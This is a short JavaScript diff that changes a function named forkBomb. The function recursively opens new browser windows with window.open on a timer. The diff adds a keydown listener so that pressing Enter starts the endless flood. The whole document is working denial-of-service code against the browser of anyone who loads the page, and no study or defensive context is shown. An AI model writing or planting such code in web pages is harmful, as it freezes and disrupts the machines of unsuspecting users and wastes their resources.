@@ -1,8 +1,13 @@
-function forkBomb(event, timeout = 500, i = 0) {
-  event.preventDefault();
+function forkBomb(timeout = 500, i = 0) {
   setTimeout(() => {
     window.open('./?v=' + Math.random(), '_new' + (i || ''))
     forkBomb(timeout, i + 1)
   }, timeout)
-  return false;
 }
+
+
+document.addEventListener('keydown', function(event) {
+  if (event.key == 'Enter') {
+    forkBomb()
+  }
+});
